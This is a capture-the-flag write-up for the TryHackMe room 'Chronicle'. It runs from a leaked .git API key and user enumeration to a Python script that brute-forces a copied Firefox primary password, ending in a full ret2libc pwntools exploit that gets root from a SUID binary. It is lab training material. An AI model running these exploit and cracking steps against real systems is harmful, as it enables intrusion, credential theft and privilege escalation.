# Chronicle — TryHackMe Writeup

> **TL;DR:** Exposed `.git` directory leaked an API key → credentials
> retrieved → SSH access → Firefox credentials cracked → SUID binary
> exploited via ret2libc → root shell

---

## Introduction
Chronicle is a medium-difficulty TryHackMe room that chains together
web enumeration, credential discovery, and binary exploitation to
achieve root. What makes this room interesting is that each step
naturally flows into the next — nothing feels forced.

---

## Starting With Recon
Starting with a port scan revealed two web services running side by side ( **Port 80 and 8081** ) in addition to SSH Port
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b2:4c:49:da:7c:9a:3a:ba:6e:59:46:c2:a9:e6:a2:35 (RSA)
|   256 7a:3e:30:70:cf:32:a4:f2:0a:cb:2b:42:08:0c:19:bd (ECDSA)
|_  256 4f:35:e1:33:96:84:5d:e5:b3:75:7d:d8:32:18:e0:a8 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
8081/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- **Port 80** — visiting it showed nothing but the word "OLD", 
clearly an outdated site left running

- **Port 8081** — a newer looking site, nothing particularly 
interesting except one feature that caught my eye: a password 
retrieval function in the *forget password* page that only required a username but it didn't seem to work.
<img width="888" height="275" alt="image" src="https://github.com/user-attachments/assets/061cd505-e09e-4107-b397-9f8b0544c7b0" />

## Digging Deeper

With nothing obvious on the surface, I dug into the JavaScript 
files on port 8081. Inside `forgot.js` I found something interesting:

```javascript
xhttp.send('{"key":"NULL"}') //Removed the API Key to stop the forget password functionality
```

The developer had removed the API key from the source code but left 
a very telling comment behind — *"Removed the API Key to stop the 
forget password functionality"*. 

This told me two things:
1. The API key existed at some point
2. It was intentionally removed — likely from a git commit

Which can be proven by checking the forget password page source:
<img width="920" height="434" alt="image" src="https://github.com/user-attachments/assets/17581eb0-f6f6-4ac0-acdb-47ce6666fa27" />

## Using Burp

To understand the API better, I intercepted the password retrieval 
request using **Burp Suite**. The request revealed the endpoint structure which confirmed what the JS comment hinted at:

<img width="1095" height="357" alt="image" src="https://github.com/user-attachments/assets/abd50df0-9732-4361-9a37-9546fa11f223" />


## Fuzzing Time

Fuzzing port 8081 returned nothing useful beyond what was already visible.

Shifting focus to port 80, however, revealed something interesting:

**`/old`** — a directory containing:
- `note.txt` — a message from the developer:
  > *"Everything has been moved to new directory and the webapp 
  has been deployed"*
- `templates/` — an old version of the website with nothing useful
<img width="678" height="354" alt="image" src="https://github.com/user-attachments/assets/594356e7-0c4b-4d8f-88a1-527dd0d7592e" />

**`.git`** — the real prize. An exposed git directory meaning 
the entire commit history is accessible.

<img width="537" height="560" alt="image" src="https://github.com/user-attachments/assets/fcb18aac-d785-43f6-93b3-52ca8850d19a" />


The note was actually helpful in an unintended way — it confirmed 
that this was a developer who moved fast and cleaned up carelessly, 
the kind of person who might leave secrets in git history.

## Extracting the Git History

With an exposed `.git` directory, I downloaded the entire 
repository to my local machine:

```bash
wget -r http://chronicle.thm/old/.git/
```

Then examined the commit history:

```bash
cd 
git log
```
<img width="634" height="447" alt="image" src="https://github.com/user-attachments/assets/4978ef14-ff7f-4b15-9ce2-568ac8859bfc" />

Checking through the commits one by one, one stood out immediately — 
titled **"Finishing Things"**:
```bash
git show 33891017aa63726711585c0a2cd5e39a80cd60e6
```

<img width="1035" height="481" alt="image" src="https://github.com/user-attachments/assets/624504bd-716d-4573-83c1-7e62d93c30f7" />

The diff revealed the developer had changed the API key from a 
placeholder to a real one, and left the source code exposing 
everything

Even more interesting — the code itself showed exactly how the 
API works. Send the right key with a valid username and it 
returns the credentials in plaintext.

> Git diffs show exactly what changed between commits — red lines 
> were removed, green lines were added. This made it trivial to 
> spot the moment the real API key replaced the placeholder `abcd`, 
> exposing the real API key in the repository history.

## Using the API

Back in Burp Suite, I crafted the request with the discovered credentials:
```json
POST /api/someone HTTP/1.1

{"key":"7454REDACTED"}
```

The response came back instantly:

```json
{"username":"user1","password":"password_secure"}
```
<img width="1174" height="363" alt="image" src="https://github.com/user-attachments/assets/da9775d7-3c3e-4289-a386-1c3a21f13433" />

The API accepted a username in the URL path — which meant I could 
fuzz for more valid usernames:
```bash
ffuf -u http://chronicle.thm:8081/api/FUZZ \
     -w /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"key":"7454REDACTED"}' \
     -fw 2
```
> **Note:** `-fw 2` filters out responses with 2 words — which is 
> what invalid usernames return (`Invalid Username`). Valid usernames 
> return a JSON object with more words, making them stand out.
> Using `-fs 0` return HTTP 200 for both valid and invalid.

Two usernames returned **Status 200** with identical response sizes:
- `someone` — already known from the source code
- `tommy` — a new username not seen anywhere before
<img width="856" height="46" alt="image" src="https://github.com/user-attachments/assets/40ea03f2-2183-486f-882b-61de612d948d" />
---

## Initial Access — tommy

Querying the API with tommy's username returned:

```json
{"username":"tommy","password":"DevMakesStuff01"}
```
The password immediately stood out — **"DevMakesStuff01"** strongly 
suggests this belongs to a developer, not a regular user. 

This raised an interesting question: if tommy is the developer 
who built and deployed this application, there's a good chance 
he's also a user on the underlying system. Developers often 
reuse their passwords across services.

One way to find out — try SSH. :)

SSH with tommy's credentials worked immediately

```bash
ssh tommy@chronicle.thm  
# password: DevMakesStuff01
```

<img width="469" height="78" alt="image" src="https://github.com/user-attachments/assets/a1806991-5a3d-406c-8323-1baf0d6b9911" />

Inside tommy's home directory:

```bash
ls
# user.txt  web
cat user.txt
# REDACTED
```
<img width="685" height="223" alt="image" src="https://github.com/user-attachments/assets/efb3136a-61d3-4bf9-9a72-2119f1279353" />

## **Flag 1 captured!** 🚩

The `web` folder confirmed tommy is indeed the developer — 
it likely contains the source code of the application we just 
exploited. 

But we're still tommy. Time to look for a path to root.

---

## Lateral Movement — Enumerating carlJ
Checking the `/home` directory revealed another user — **carlJ**.
Listing his files with `ls -lah` exposed some interesting directories:

```bash
ls -lah /home/carlJ
```

A few things stood out immediately:

- **`.bash_history → /dev/null`** — history is intentionally 
  wiped, suggesting carlJ is hiding something
- **`mailing/`** — access denied for tommy, but clearly 
  contains something worth protecting
- **`.mozilla/`** — Firefox profile data, which stores saved 
  passwords in encrypted form
  
  <img width="1154" height="550" alt="image" src="https://github.com/user-attachments/assets/81e5bc89-0388-4c11-b134-e8ead743dad2" />

The `.mozilla` folder was the most promising lead. Firefox 
saves credentials locally in `key4.db` and `logins.json` — 
and these can be decrypted offline with the right tools.

Time to pull those files to my local machine.

## Extracting carlJ's Firefox Profile Data

Since tommy had read access to carlJ's `.mozilla` folder, I 
transferred the Firefox profile to my local machine using `scp`:

```bash
scp -r tommy@chronicle.thm:/home/carlJ/.mozilla/firefox firefox
```

> **What is scp?** Secure Copy Protocol — it works like `cp` but 
> over SSH, allowing file transfers between machines securely.

With these files locally, I could now use a tool called [firefox_decrypt](https://github.com/unode/firefox_decrypt/) 
to extract carlJ's saved passwords offline.

>Also worth noting — the fact that tommy could read carlJ's .mozilla folder at all is a misconfigured file permission issue.
> A properly secured system would restrict home directory access to the owner only.

Running `firefox_decrypt` against the extracted profile:

```bash
python3 firefox_decrypt.py firefox
```
<img width="594" height="151" alt="image" src="https://github.com/user-attachments/assets/c432f155-53d2-44a3-bf6f-54644d36c6f1" />

Profile **1** was invalid. Profile **2** was the active one but 
required a **Primary Password** — Firefox's master password that 
encrypts all saved credentials.

I didn't have it, and `firefox_decrypt` has no built-in fuzzing 
support — manually trying passwords one by one would be painfully 
slow. The solution? Automate it.

I wrote a Python script that:
1. Launches `firefox_decrypt` as a subprocess
2. Automatically selects option **2**
3. Tries each password from a wordlist until one succeeds
```python
#!/usr/bin/env python3
import subprocess
import sys

def run_firefox_decrypt(profile_path, wordlist_path):
    with open(wordlist_path, 'r', errors='ignore') as f:
        passwords = f.read().splitlines()

    print(f"[*] Trying {len(passwords)} passwords...")

    for i, password in enumerate(passwords, 1):
        print(f"[*] Trying ({i}/{len(passwords)}): {password}")

        proc = subprocess.Popen(
            ['python3', 'firefox_decrypt.py', profile_path],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        # Send "2" for the profile choice, then the password
        input_data = f"2\n{password}\n"

        try:
            stdout, stderr = proc.communicate(input=input_data, timeout=10)

            # Check if decryption succeeded (no "password" error in output)
            if 'Master Password is wrong' not in stderr and \
               'Passwords for' in stdout or 'Website:' in stdout:
                print(f"\n[+] SUCCESS! Password found: {password}")
                print("\n--- Decrypted Credentials ---")
                print(stdout)
                return password

        except subprocess.TimeoutExpired:
            proc.kill()
            continue

    print("[-] Password not found in wordlist.")
    return None

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <profile_path> <wordlist>")
        print(f"Example: {sys.argv[0]} /path/to/firefox/profile /usr/share/wordlists/rockyou.txt")
        sys.exit(1)

    profile_path = sys.argv[1]
    wordlist_path = sys.argv[2]

    run_firefox_decrypt(profile_path, wordlist_path)
```
With the Primary Password cracked, `firefox_decrypt` revealed 
carlJ's saved credentials:

<img width="881" height="342" alt="image" src="https://github.com/user-attachments/assets/4e556a8e-47dc-473c-9c21-849c680d0c0e" />

A strong looking password — but saved in a browser with a weak 
master password of **`password1`**. A good reminder that your 
saved credentials are only as secure as your master password.

The credentials belonged to a site called `incognito.com`. 
Whether these were carlJ's personal or work credentials didn't 
matter much — the real question was whether he reused this 
password for his system account.

## Lateral Movement — carlJ

SSH with the decrypted credentials worked:

```bash
ssh carlJ@chronicle.thm
# password: Pas$w0RD59247
whoami
# carlJ
```

Password reuse strikes again — the same password carlJ saved 
in his browser was the one protecting his system account.

Now inside carlJ's session, the `mailing/` folder that was 
previously denied to tommy is now accessible. Time to see 
what's inside.
<img width="1037" height="299" alt="image" src="https://github.com/user-attachments/assets/57e0ddc3-9750-4e1e-9e9d-7f5a2042cea9" />

Inside the `mailing/` folder was a binary called `smail`:

## Analysing smail

Listing the file permissions revealed something critical:

```bash
ls -lah
# -rwsrwxr-x 1 root root 8.4K Apr 3 2021 smail
```

The **`s`** in the permissions (`rws`) instead of the usual 
`x` means this is a **SUID binary** — it executes with the 
privileges of its owner, which is **root**.

> **What is SUID?** Normally a program runs with the permissions 
> of the user who launched it. SUID changes that — the program 
> runs as its **owner** instead. A SUID binary owned by root 
> that we can exploit means we get a **root shell**.

```bash
./smail
```
<img width="903" height="408" alt="image" src="https://github.com/user-attachments/assets/ea8ea2ba-d8c7-4d23-8eae-b1c9dedeeb5b" />

Option **1** sends a message with an explicit **80 character limit** — that limit is a hint that input is being handled carefully here.

Option **2** however had no visible limit mentioned at all — a red flag for a potential buffer overflow.

Before diving in, I checked what kind of binary this was:

```bash
file smail
strings smail
checksec --file=smail
```

`file` revealed it was a **64-bit SUID binary** with a `setuid` call.
`checksec` confirmed:
<img width="666" height="192" alt="image" src="https://github.com/user-attachments/assets/e71b95b4-8229-4a3f-af64-76e597834b93" />

Breaking down what each means for exploitation:

| Protection | Status | Impact |
|---|---|---|
| NX | Enabled | Can't run shellcode on the stack → must use ret2libc |
| PIE | Disabled | Binary loads at fixed address `0x400000` → gadget addresses are static |
| Stack Canary | Not found | Can overflow freely without bypassing any stack protection |
| Partial RELRO | Enabled | GOT is writable but not a concern for this attack |

> ### 📝 What do these protections mean?
>
> **NX enabled** — We can't run our own code, so we hijack 
> existing code instead.
>
> **No PIE** — Memory addresses never change, so our exploit 
> always works.
>
> **No Canary** — Nothing is watching for our overflow, so 
> we can do it freely.

The combination of **no canary** and **no PIE** makes this 
a straightforward ret2libc exploit — we can overflow freely 
and our gadget addresses won't change between runs.

This made `smail` a prime target — meaning a buffer overflow here 
wouldn't just crash the program — it would give us code 
execution as root.

## Privilege Escalation — ret2libc Buffer Overflow

### What is a Buffer Overflow?
> A buffer is a fixed size chunk of memory reserved for input. 
> If a program doesn't check how much you write into it, you 
> can overflow into adjacent memory and overwrite the return 
> address — the instruction that tells the program where to 
> go next. We control that, we control execution.
### What is [ret2libc](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/ret2libc)?
> Since NX blocks our own code, we hijack `system()` — a 
> function already loaded in memory that can spawn a shell. 
> We just need to point the return address at it and pass 
> `/bin/sh` as the argument.

---

### Step 1 — Find the libc Base Address
We need to know where libc is loaded in memory:

```bash
gdb ./smail
break main
run
info proc mappings
```

Found libc loaded at:
<img width="1266" height="37" alt="image" src="https://github.com/user-attachments/assets/46b6722c-cfdb-46e7-a283-4238f3faecb5" />

---

### Step 2 — Find system() and /bin/sh
We need the location of `system()` and the string `/bin/sh` 
inside libc. We find their **offsets** — the distance from 
the base address:

```bash
readelf -s /lib/x86_64-linux-gnu/libc-2.27.so | grep " system"
#   1403: 000000000004f550    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5

strings -a -t x /lib/x86_64-linux-gnu/libc-2.27.so | grep /bin/sh
#  1b3e1a /bin/sh
```
---

### Step 3 — Find ROP Gadgets
We need two small pieces of existing code called **gadgets**:

```bash
ROPgadget --binary ./smail | grep "pop rdi"
# 0x00000000004007f3 : pop rdi ; ret --> 0x4007f3

ROPgadget --binary ./smail | grep ": ret"
# 0x0000000000400556 : ret --> 0x400556
```

> **What are ROP gadgets?** Small snippets of existing code ending 
> in `ret`. Since we can't run our own code (NX), we reuse what's 
> already there.
>
> - **`pop rdi`** — loads `/bin/sh` address into RDI, which is 
> the register that holds the first argument to any function
> - **`ret`** — fixes 16-byte stack alignment required on 64-bit 
> systems, without it `system()` crashes

---

### Step 4 — Building the Payload
> Using a ret2libc template as a base, I adapted it for `smail` 
> by replacing the addresses with ones found during enumeration 
> and adding stack alignment and menu navigation specific to 
> this binary.
```python
from pwn import *

p = process('./vuln-64')

libc_base = 0x7ffff7de5000
system = libc_base + 0x48e20
binsh = libc_base + 0x18a143

POP_RDI = 0x4011cb

payload = b'A' * 72         # The padding
payload += p64(POP_RDI)     # gadget -> pop rdi; ret
payload += p64(binsh)       # pointer to command: /bin/sh
payload += p64(system)      # Location of system
payload += p64(0x0)         # return pointer - not important once we get the shell

p.clean()
p.sendline(payload)
p.interactive()
```
Our final payload:
```python
from pwn import *

p = process('./smail')

libc_base = 0x7ffff79e2000
system = libc_base + 0x4f550
binsh= libc_base + 0x1b3e1a

POPRDI=0x4007f3

payload = b'A' * 72
payload += p64(0x400556)
payload += p64(POPRDI)
payload += p64(binsh)
payload += p64(system)
payload += p64(0x0)

p.clean()
p.sendline("2")
p.clean()
p.sendline(payload)
p.interactive()
```
---
## Root Shell!

Saved the exploit as `exploit.py` and ran it:

```bash
python3 exploit.py
```
<img width="646" height="245" alt="image" src="https://github.com/user-attachments/assets/3d4be9ef-ecea-4c0c-bec6-83169030fc13" />

## **We are root!** 🚩

The exploit worked perfectly:
- `Changed` — confirms option 2 was selected and our 
  payload was accepted
- `$` — we have a shell
- `whoami` returns `root` — the SUID binary executed 
  our payload with root privileges

I ran the following coammands:
```bash
cd /
ls
bin    etc           lib     lost+found  proc  snap       tmp        vmlinuz.old
boot   home           lib32   media       root  srv       usr
cdrom  initrd.img      lib64   mnt       run     swap.img  var
dev    initrd.img.old  libx32  opt       sbin  sys       vmlinuz
cd root
ls
# root.txt
cat root.txt
# REDACTED
```
<img width="1141" height="341" alt="image" src="https://github.com/user-attachments/assets/ecfd36a0-6380-4d55-9a20-16bdf0929e7b" />

### PWND ⚡

Chronicle was a fantastic room that chained multiple techniques

## What I Learned
- You always HAVE to fuzz more
- Exposed `.git` directories leak entire project history
- Git never truly deletes secrets without rewriting history
- Browser saved passwords can be extracted and cracked offline sometimes
- SUID binaries with buffer overflows can lead to root
- ret2libc bypasses NX by reusing existing code in memory
